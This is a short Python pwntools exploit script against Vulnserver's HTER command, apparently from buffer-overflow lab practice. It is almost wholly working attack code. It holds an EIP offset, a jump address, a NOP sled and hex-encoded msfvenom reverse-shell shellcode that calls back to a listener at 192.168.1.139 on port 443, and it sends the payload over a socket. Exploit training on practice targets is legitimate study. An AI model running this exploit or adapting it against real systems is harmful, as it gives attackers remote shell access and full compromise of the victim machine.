from pwn import * # pylint: disable=unused-wildcard-import
context.log_level = 'debug' # pylint: disable=assigning-non-slot

# IP and port of the target (Vulnserver).
ip = "192.168.1.132"
port = 9999

cmd= "HTER "
offset_eip = 2046
eip = "AF115062" # Address of instruction we want to run (Ex. jmp esp).

# Here we put the shellcode we want to execute.
offset_sc = offset_eip + 8
shellcode = "90"*16
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.139 LPORT=443 EXITFUNC=thread -f hex -b "\x00\x0a"
shellcode += "dac0d97424f4bb27654f325d2bc9b152315d17035d1783ca99adc7e88ab028104bd5a1f57ad5d67e2ce59dd2c18ef0c652e2dce9d3493bc4e4e27f4767f953a75632a6a69f2f4bfa483bfeeafd71c3814e974376069662291cc1a4c8f179edd21647a769ec3336bb3cbb9582f04ee7c337b1923d444ca5fa368a2018905992c4208d458f2f7a01d7337dc66c4ff6e9a2d94cce6681176f3f6ff9905fd0a63414fdb344776a7765876a1ffef458805492d04973651660c3f9e98b34d02ddf644a8760ef8a28b5a0da8666018a66d7e9c0680809eba221a016258e9d193e66dc1941cc69ff2b223ca8c3db65227523b04fb5af37b078583da2eda80898b8b7a6b427252d442156fa1366a8f3f19a93ade7664595a3bcb6182a30823e3c8c0b7b68405ad5c6263497b0f0eb715484c74122890d34ca38f801f5f56c868eeb0c6945a82d884fc5c5151a6488a5f1abb525f353423576510ef16b2b1f948b9820bd"

# Create our payload.
payload = fit({
    0:cmd,
    offset_eip:eip,
    offset_sc:shellcode
    },length=5000,filler=de_bruijn(alphabet="123456789ABCDEF"))
# pwn cyclic -a "123456789ABCDEF" -l "37B1"
io = remote(ip,port)
io.readline()
io.sendline(payload)

# filename = "filename.ext"

# with open(filename,"w+") as f:
#     f.write(payload)
